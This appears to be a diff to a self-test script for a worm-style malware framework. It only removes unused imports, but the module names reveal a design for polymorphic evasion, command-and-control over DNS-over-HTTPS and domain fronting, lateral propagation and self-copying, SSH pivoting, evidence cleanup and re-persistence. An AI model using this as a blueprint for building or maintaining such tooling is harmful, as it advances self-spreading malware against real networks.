@@ -13,7 +13,6 @@ __test__ = False  # pytest marker: run as script, not auto-discovered
 import hashlib
 import os
 import sys
-import threading
 import time
 
 # Force UTF-8 stdout on Windows (avoids charmap codec errors)
@@ -48,7 +47,6 @@ print(SEP)
 try:
     from evasion.advanced_polymorphic import (
         AdvancedPolymorphicEngine,
-        ASTMetamorphTransformer,
         NetworkFingerprintRandomiser,
         StringObfuscator,
     )
@@ -107,8 +105,6 @@ print()
 try:
     from c2.resilient_c2 import (
         CommandQueue,
-        DoHChannel,
-        DomainFrontingChannel,
         P2PGossip,
         ResilientC2Engine,
         _decrypt,
@@ -184,10 +180,7 @@ print()
 # ─── 3. Wave Propagation Engine ──────────────────────────────────────────────
 try:
     from core.wave_propagation import (
-        IntelHarvester,
-        PivotScanner,
         PropagationGraph,
-        SelfCopyTransfer,
         WavePropagationEngine,
     )
 
@@ -257,8 +250,6 @@ try:
     from core.agent_controller import (
         AgentController,
         AgentSession,
-        QuickIntelCollector,
-        SSHSessionManager,
     )
 
     # AgentSession dataclass
@@ -330,7 +321,6 @@ try:
         AdvancedSelfHealingEngine,
         EvidenceCleanup,
         ModuleIntegrityChecker,
-        RePersistenceGuard,
     )
 
     base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -380,7 +370,6 @@ try:
 
     # WormCore import sanity check
     try:
-        from worm_core import WormCore
 
         check("WormCore import with v2 modules", True, "import OK")
     except Exception as e:
